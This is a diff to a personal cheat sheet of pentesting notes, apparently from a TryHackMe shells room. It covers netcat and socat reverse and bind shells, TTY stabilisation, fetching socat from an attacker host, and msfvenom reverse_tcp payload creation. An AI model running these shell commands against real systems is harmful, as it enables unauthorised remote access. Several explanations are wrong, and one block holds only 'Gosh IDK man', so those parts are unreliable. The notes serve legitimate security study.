@@ -565,6 +565,8 @@ Reverse Shell Cheatsheet
 Reverse Shell Generator
 >https://www.revshells.com/
 
+---
+
 ## Reverse Shell example
 
 on the attacking machine
@@ -578,6 +580,8 @@ on the target
 nc <LOCAL-IP> <PORT> -e /bin/bash
 ```
 
+---
+
 ## Bind Shell example
 
 On the attacking machine
@@ -590,6 +594,8 @@ On the target
 nc -lvnp <port> -e "cmd.sh"
 ```
 >--cmd.exe would contain code that starts a listener attached to a shell directly on the target
+
+---
 
 ## Stabilisation
 
@@ -612,6 +618,8 @@ stty raw -echo; fg
 ```
 >foregrounds the shell gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes
 
+---
+
 ## rlwrap listener & stabilization
 ```
 rlwrap nc -lvnp <port>
@@ -619,6 +627,8 @@ rlwrap nc -lvnp <port>
 >starts listener on host
 
 background the shell with `Ctrl + Z`, then use `stty raw -echo; fg` to stabilise and re-enter the shell. 
+
+---
 
 ## soCat stabilization
 
@@ -633,6 +643,9 @@ get <LOCAL-IP>/socat -O /tmp/socat
 ```
 ~Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
 ```
+
+---
+
 ## Change terminal tty size~
 
 First, open another terminal and run 
@@ -650,10 +663,11 @@ This will change the registered width and height of the terminal, thus allowing 
 
 # socat
 
+### Reverse Shell
+
 ```
 socat TCP-L:<port> -
 ```
-
 basic reverse shell listener in socat
 
 >will work on Linux or Windows
@@ -663,7 +677,62 @@ socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
 ```
 windows reverse shell from target
 
-```
+```console
 socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
 ```
-Linux Reverse shell on target
+Linux Reverse shell from target
+
+---
+
+## Bind Shell
+
+```console
+socat TCP-L:<PORT> EXEC:"bash -li"
+```
+>target command
+
+```
+socat TCP-L:<PORT> EXEC:powershell.exe,pipes
+``` 
+>listener for windows
+
+```
+socat TCP:<TARGET-IP>:<TARGET-PORT> -
+```
+>used to connect from attacking machine
+
+---
+
+## Stable tty reverse shell
+
+>will only work on a Linux target
+
+```
+socat TCP-L:<port> FILE:`tty`,raw,echo=0 
+```
+
+>listener
+
+```
+Gosh IDK man 
+```
+As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z
+
+>https://tryhackme.com/room/introtoshells
+
+---
+
+# msfvenom create payloads
+
+```
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
+```
+
+- -p    creates payload
+- windows/x64/shell/reverse_tcp     reverse shell for a x86 Linux Target
+- -f    prints to .exe format
+- lhost     listen IP
+- lport     target IP
+
+---
+
